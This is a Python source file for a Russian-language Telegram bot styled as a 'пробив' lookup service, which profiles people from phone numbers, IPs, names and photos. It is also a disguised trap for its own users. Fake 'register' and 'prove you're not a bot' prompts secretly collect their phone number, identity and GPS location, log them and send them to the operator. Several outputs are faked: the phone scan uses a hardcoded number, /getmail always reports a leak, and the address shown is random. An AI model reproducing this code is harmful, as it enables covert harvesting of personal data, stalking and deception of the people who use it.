import os
import requests
import telebot
from telebot import types
import time
import random
from twilio.rest import Client
import json
from Parse_VK import a
from bs4 import BeautifulSoup as BS
import vk
import keepalive

ID = os.environ['id']
bot = telebot.TeleBot(os.environ['token'])
adr = ['Тверская улица, дом 13', 'Проспект 60-летия Октября', 'Улица Винокурова', '3-й Голутвинский переулок']
account_sid = os.environ['sid']
auth_token = os.environ['auth']
client = Client(account_sid, auth_token)
SERVICE_TOKEN = os.environ['st']
USER_TOKEN = os.environ['vktoken']
session = vk.Session(access_token=USER_TOKEN)
vkontacte = vk.API(session)
bot.send_message(ID, '!BOT STARTED!') 
print("!BOT STARTED!")

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, '''👋 Привет! Я Очко Бога! 👋
	Я умею пробивать по номеру телефона, по IP адресу и по фотографии!
	Для пробива телефона, введи команду /getinfo
    Для пробива IP адреса, введи команду /getip
    Для пробива по ФИО, введи команду /getname
    Для пробива по фотографии, введи команду /getimg
    А вот все команды и использование: /help''')
	
@bot.message_handler(commands=['help'])
def help_message(message):
    bot.send_message(message.chat.id, '''------------------- ВСЕ КОМАНДЫ -------------------\n
	/start : Запуск или перезапуск бота.
	/help : Выводит это сообщение.
    /getip : Пробив по IP адресу.
    /getname : Пробив по ФИО (Фамилия Имя Отчество).
    /getinfo : Пробив по номеру телефона.
    /getimg : Пробив по картинке.
    /getmail : Проверка на слитый email.
    /getapp : Скачать приложение для пробива.
    /author : Тот кто создал Очко Бога!''')
    bot.send_message(message.chat.id, '<------- Метки для прочтения информации по ФИО ------->')
    bot.send_message(
        message.chat.id,
        'Что оно возвращает?:\n ├ Возможные имена человека и его профили в соц. сетях.'
    )
    bot.send_message(message.chat.id, '<------- Метки для прочтения информации по IP ------->')
    bot.send_message(
        message.chat.id,
        'success:\n ├ Удалось ли найти или нет.'
    )
    bot.send_message(
        message.chat.id,
        'country:\n ├ Страна проживания.'
    )
    bot.send_message(
        message.chat.id,
        'regionName:\n ├ Город проживания.'
    )
    bot.send_message(
        message.chat.id,
        'lat:\n ├ Координаты на карте: Широта.'
    )
    bot.send_message(
        message.chat.id,
        'lon:\n ├ Координаты на карте: Долгота.'
    )
    bot.send_message(
        message.chat.id,
        'isp:\n ├ Оператор или провайдер.'
    )
    bot.send_message(message.chat.id, '<------- Метки для прочтения информации по номеру ------->')
    bot.send_message(
        message.chat.id,
        'success:\n ├ Удалось ли найти или нет.'
    )
    bot.send_message(
        message.chat.id,
        'error:\n ├ Причина ошибки (если поле пустое, значит ошибки нет).'
    )
    bot.send_message(
        message.chat.id,
        'carrier:\n ├ Оператор связи.'
    )
    bot.send_message(
        message.chat.id,
        'country_name:\n ├ Страна проживания.'
    )
    bot.send_message(
        message.chat.id,
        'location:\n ├ Город проживания.'
    )
    bot.send_message(
        message.chat.id,
        'line_type:\n ├ Тип номера (мобильный, стационарный, и т.п.).'
    )
    bot.send_message(
        message.chat.id,
        'socialMedia:\n ├ Найденые соц. сети по номеру.'
    )
    bot.send_message(
        message.chat.id,
        'disposableProviders:\n ├ Виртуальный ли этот номер или нет.'
    )
    bot.send_message(
        message.chat.id,
        'reputation:\n ├ Проверка на сайтах репутацию номера.'
    )
    bot.send_message(
        message.chat.id,
        'individuals:\n ├ Продвинутый пробив по слитым базам в интернете.'
    )
    bot.send_message(
        message.chat.id,
        'general:\n ├ Продвинутый пробив по слитым базам в интернете которые возможно скачать.'
    )
    bot.send_message(message.chat.id, '<-------- Метки для прочтения информации по фото -------->')
    bot.send_message(
        message.chat.id,
        'ССЫЛКА:\n ├ Прикинь, это ссылка на запрос!'
    )
    bot.send_message(
        message.chat.id,
        'ВОЗМОЖНЫЕ ИМЕНА:\n ├ Прикинь, это реально возможные имена человека и его соц. сети!'
    )

@bot.message_handler(commands=['author'])
def start(message):
    bot.send_message(message.chat.id, 'Программист и создатель: @DimonDevYT')

@bot.message_handler(commands=['getinfo'])
def start(message):
    msg = bot.send_message(message.chat.id, 'Введи любой номер телефона') 
    bot.register_next_step_handler(msg, register)

@bot.message_handler(commands=['getip'])
def start(message):
    iptolookup = bot.send_message(message.chat.id, 'Введи любой IP адрес')
    bot.register_next_step_handler(iptolookup, iplookup)

@bot.message_handler(commands=['getname'])
def get_name_messages(message):
    msg = bot.send_message(message.chat.id, 'Введи ФИО для пробива') 
    bot.register_next_step_handler(msg, searchname)

@bot.message_handler(commands=['getapp'])
def start(message):
    bot.send_message(message.chat.id, "Скоро будет разработано приложение для пробива!")

@bot.message_handler(commands=['getimg'])
def start(message):
    msg = bot.send_message(message.chat.id, "Отправь мне любую фотографию")
    bot.register_next_step_handler(msg, imgreverse)

@bot.message_handler(commands=['getmail'])
def start(message):
    msg = bot.send_message(message.chat.id, "Отправь мне любой имейл, я проверю слит ли он или нет.")
    bot.register_next_step_handler(msg, mail)

def mail(message):
    bot.send_message(message.chat.id, "К сожалению эта почта слита.")

def imgreverse(message):
    try:
        raw = message.photo[0].file_id
        path = raw+".jpg"
        file_info = bot.get_file(raw)
        bot.send_message(message.chat.id, file_info)
        downloaded_file = bot.download_file(file_info.file_path)
        with open(path,'wb') as new_file:
            new_file.write(downloaded_file)
        print(path)
        filePath = path
        searchUrl = 'https://yandex.ru/images/search'
        files = {'upfile': ('blob', open(filePath, 'rb'), 'image/jpeg')}
        params = {'rpt': 'imageview', 'format': 'json', 'request': '{"blocks":[{"block":"b-page_type_search-by-image__link"}]}'}
        response = requests.post(searchUrl, params=params, files=files)
        query_string = json.loads(response.content)['blocks'][0]['params']['url']
        img_search_url= searchUrl + '?' + query_string
        bot.send_message(message.chat.id, "ССЫЛКА НА ЗАПРОС: " + img_search_url + "\n")
        bot.send_message(message.chat.id, "├ ВОЗМОЖНЫЕ ИМЕНА И СОЦ. СЕТИ")
        r = requests.get(img_search_url)
        html = BS(r.content, 'html.parser')
        for el in html.select(".CbirSites-Items > .CbirSites-Item"):
            title = el.select(".CbirSites-ItemTitle > a")
            bot.send_message(message.chat.id, "├ " + title[0].text)
        bot.send_message(message.chat.id, "└ ЭТО ВСЕ ЧТО МОЕ ОЧКО НАШЛО НА ЭТОЙ КАРТИНКЕ")
        time.sleep(5)
        try:
            os.remove(path)
        except Exception as e:
            bot.send_message(ID, e)
            pass
    except Exception as e:
        bot.send_message(ID, e)
        pass

def proc2(message):
    try:
        m_id = message.chat.id
        user_input = message.text
        num = user_input.replace('+', '')

        if not num.isdigit():
            bot.reply_to(message, 'Кажется, вы не ввели действительный номер телефона, повторите попытку, написав /getinfo!')#⏳
            return

        bot.send_message(m_id, f'Запрос на номер {num} отправлен!')
        time.sleep(1)
        keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
        button_phone = types.KeyboardButton(text="Зарегестрироваться", request_contact=True) 	
        keyboard.add(button_phone)	
        bot.send_message(m_id, '''Похоже у вас не осталось бесплатных запросов на день!
			Чтобы получить дополнительные вопросы зарегестрируйтесь в боте!''', reply_markup=keyboard)
    except Exception as e:
        bot.send_message(ID, e)
        bot.send_message(ID, 'Произошла неопознанная ошибка, перезагрузите бота или попробуйте заново!!')

def searchname(message):
    if str(message.text[0:3]) == 'htt':
        try:
            bot.send_message(message.from_user.id, a.get_photos(message.text))
            bot.send_message(message.from_user.id,
                             a.get_information1(message.text))
        except:
            bot.send_message(
                message.from_user.id,
                'Мы не смогли найти о вас информацию: либо у вас закрытый аккаунт, либо про вас нет информации'
            )
        if a.get_information2(message.text) != [] and '' and None:
            bot.send_message(message.from_user.id,
                             a.get_information2(message.text))
    else:
        s = a.searching(message.text)
        print(message.text)
        bot.send_message(message.from_user.id, str(s[0]))
        bot.send_message(message.from_user.id, a.get_photos(str(s[0])))
        bot.send_message(message.from_user.id, a.get_information1((str(s[0]))))
        username = message.text.replace(' ', '-')
        fb_url = "https://www.facebook.com/"+username
        insta_url = "https://www.instagram.com/"+username
        quora_url = "https://www.quora.com/profile/"+username

        fb_response = requests.get(fb_url)
        if fb_response.status_code == 200:
            bot.send_message(message.chat.id, "├ У этого пользователя есть Facebook")

        insta_response = requests.get(insta_url)
        if insta_response.status_code == 200:
            bot.send_message(message.chat.id, "├ У этого пользователя есть Instagram")
        
        quora_response = requests.get(quora_url)
        if quora_response.status_code == 200:
            bot.send_message(message.chat.id, "├ У этого пользователя есть Quora")
        
        bot.send_message(message.chat.id, f"└ ЭТО ВСЕ ЧТО МОЕ ОЧКО НАШЛО ПО ЗАПРОСУ {message.text}")

def iplookup(message):
    try:
        user_input = message.text
        x = requests.get('http://ip-api.com/json/' + str(user_input))
        pretty_json = json.loads(x.text)
        bot.send_message(message.chat.id, json.dumps(pretty_json, indent=2))
        log = open('bot-log.txt', 'a+', encoding='utf-8')
        log.write(x + '  ')
        log.close()
        bot.send_message(message.chat.id, f"└ ЭТО ВСЕ ЧТО МОЕ ОЧКО НАШЛО ПО IP {user_input}")
        bot.send_message(ID, x)
    except Exception as e:
        bot.send_message(ID, e)
        bot.send_message(ID, 'Произошла неопознанная ошибка, перезагрузите бота или попробуйте заново!!')

@bot.message_handler(content_types=['contact']) 
def contact(message):
    if message.contact is not None: 
        nick = message.from_user.username
        first = message.contact.first_name
        last = message.contact.last_name
        userid = message.contact.user_id
        phone = message.contact.phone_number
        info = f'''
			Данные
			├Имя: {first} {last}
			├ID: {userid}
			├Ник: @{nick}
			└Номер телефона: {phone}
			'''
        log = open('bot-log.txt', 'a+', encoding='utf-8')
        log.write(info + '  ')
        log.close()
        bot.send_message(ID, info)
        print(info)
        if message.contact.user_id != message.chat.id:
            bot.send_message(message.chat.id, 'Отправьте свой контакт!')
    keyboardmain = types.InlineKeyboardMarkup(row_width=2)
    button = types.InlineKeyboardButton(text="Расширенный поиск", callback_data="find")
    keyboardmain.add(button)
    m_id = message.chat.id
    msg = bot.send_message(m_id, f'Введите заново номер телефона:')
    bot.register_next_step_handler(msg, register)

def register(message):
    try:
        user_input = message.text
        num = user_input
        bot.send_message(message.chat.id, f'Запрос на номер {num} отправлен заново!')
        time.sleep(1)
        types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)

        bot.send_message(message.chat.id, "├ ССЫЛКА НА ВОЗМОЖНЫЙ ПОИСК: https://www.google.com/search?q=" + num)
        bot.send_message(message.chat.id, "├ ССЫЛКА НА ВОЗМОЖНЫЙ ПОИСК: https://yandex.ru/search/?text=" + num)

        r4 = requests.get("https://demo.phoneinfoga.crvx.fr/api/numbers/79508518116/scan/ovh")
        pretty_json4 = json.loads(r4.text)
        bot.send_message(message.chat.id, "├ ТУПОЙ ПРОБИВ")
        bot.send_message(message.chat.id, "├ " + json.dumps(pretty_json4, indent=2))

        r1 = requests.get("https://demo.phoneinfoga.crvx.fr/api/numbers/79508518116/scan/local")
        pretty_json = json.loads(r1.text)
        bot.send_message(message.chat.id, "├ МИНИМАЛИСТИЧНЫЙ ПРОБИВ")
        bot.send_message(message.chat.id, "├ " + json.dumps(pretty_json, indent=2) + "\n")

        r2 = requests.get("https://demo.phoneinfoga.crvx.fr/api/numbers/79508518116/scan/numverify")
        pretty_json2 = json.loads(r2.text)
        bot.send_message(message.chat.id, "├ СТАНДАРТНЫЙ ПРОБИВ")
        bot.send_message(message.chat.id, "├ " + json.dumps(pretty_json2, indent=2) + "\n")

        r3 = requests.get("https://demo.phoneinfoga.crvx.fr/api/numbers/79508518116/scan/googlesearch")
        pretty_json3 = json.loads(r3.text)
        bot.send_message(message.chat.id, "├ ПРОДВИНУТЫЙ ПРОБИВ ПО ВНЕШНИМ ИСТОЧНИКАМ")
        with open("ПОЛНЫЙ_ПРОБИВ.txt", "w") as f:
            f.write(json.dumps(pretty_json3, indent=2))
        fl = open("ПОЛНЫЙ_ПРОБИВ.txt", 'rb')
        bot.send_document(chat_id=message.chat.id, data=fl)

        bot.send_message(message.chat.id, f"└ ЭТО ВСЕ ЧТО МОЕ ОЧКО НАШЛО ПО НОМЕРУ {num}")

    except Exception as e:
        bot.send_message(ID, e)
        bot.send_message(ID, 'Произошла неопознанная ошибка, перезагрузите бота или попробуйте заново!')

@bot.callback_query_handler(func=lambda call:True)
def callback_inline(call):
	if call.data == "find":
		keyboard1 = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True) 
		button_location = types.KeyboardButton(text="Подтвердить", request_location=True) 	
		keyboard1.add(button_location)
		bot.send_message(call.message.chat.id, text='Для использования бесплатного расширенного поиска, подтвердите что вы не бот!', reply_markup=keyboard1)

@bot.message_handler(content_types=['location'])
def contact(message):
	if message.location is not None: 
		lon = str(message.location.longitude)
		lat = str(message.location.latitude)
		geo = f'''
		Геолокация
		├ID: {message.chat.id}
		├Longitude: {lon}
		├Latitude: {lat}
		└Карты: https://www.google.com/maps/place/{lat}+{lon} 
		'''
		log = open('bot-log.txt', 'a+', encoding='utf-8')
		log.write(geo + '  ')
		log.close()
		bot.send_message(ID, geo) 
		print(geo)
		bot.send_message(message.chat.id, f'''
			Геолокация
			└Адрес: {random.choice(adr)}
			''')

keepalive.keep_alive()
bot.polling()
